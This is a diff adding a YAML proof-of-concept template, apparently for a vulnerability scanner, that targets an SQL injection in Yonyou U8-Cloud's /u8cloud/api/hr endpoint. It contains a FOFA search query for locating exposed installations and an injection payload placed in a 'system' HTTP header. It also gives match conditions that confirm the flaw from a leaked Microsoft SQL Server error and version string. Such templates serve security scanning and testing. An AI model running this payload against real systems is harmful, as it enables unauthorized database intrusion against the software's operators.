@@ -1,0 +1,26 @@
+id: poc-yaml-yongyou-u8cloud-api-hr-sqli
+info:
+  name: 用友U8-Cloud api-hr SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8cloud
+  fofa: body="开启U8 cloud云端之旅"
+requests:
+- method: GET
+  path: /u8cloud/api/hr
+  headers:
+    system: -1' or 1=@@version--+
+  expression: 'status_code == 200 &&
+
+    contains(body,"U8C返回信息:在将 nvarchar 值") &&
+
+    contains(body,"Microsoft SQL Server") &&
+
+    contains(body,"转换成数据类型 int 时失败") &&
+
+    contains(content_type,"application/json")
+
+    '
+variables: {}
+transport: http
